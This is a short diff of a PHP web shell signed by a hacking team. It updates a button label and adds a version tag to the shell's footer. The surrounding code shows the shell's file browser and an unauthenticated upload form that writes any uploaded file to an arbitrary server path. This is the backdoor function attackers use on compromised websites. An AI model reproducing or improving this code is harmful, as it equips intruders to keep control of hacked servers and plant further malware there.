@@ -109,7 +109,7 @@ echo '">'.$pat.'</a>/';
 //upload
 echo '<br><br><br><font color="white"><form enctype="multipart/form-data" method="POST">
 UPLOAD FILE: <input type="file" name="file" style="color:white;border:2px solid white;" requiwhite/></font>
-<input type="submit" value="TUSBOLL" style="margin-top:4px;width:100px;height:27px;font-family:Kelly Slab;font-size:15;background:black;color: white;border:2px solid white;border-radius:5px"/>';
+<input type="submit" value="GASSKEN" style="margin-top:4px;width:100px;height:27px;font-family:Kelly Slab;font-size:15;background:black;color: white;border:2px solid white;border-radius:5px"/>';
 if(isset($_FILES['file'])){
 if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
 echo '<br><br><font color="lime">SUCCESSFULLY TO UPLOAD</font><br/>';
@@ -296,7 +296,7 @@ echo "</center></td>
 echo '</table>
 </div>';
 }
-echo '<center><br/><font face="Kelly Slab" color="white" style="text-shadow:0 0 5px white; font-weight:bold: white; font-size:15px; letter-spacing: 5px;"> SonySec07 | MukoMuko Cyber Team</center>
+echo '<center><br/><font face="Kelly Slab" color="white" style="text-shadow:0 0 5px white; font-weight:bold: white; font-size:15px; letter-spacing: 5px;"> SonySec07 | MukoMuko Cyber Team | Ver3.2</center>
 </body>
 </html>';
 function perms($file){
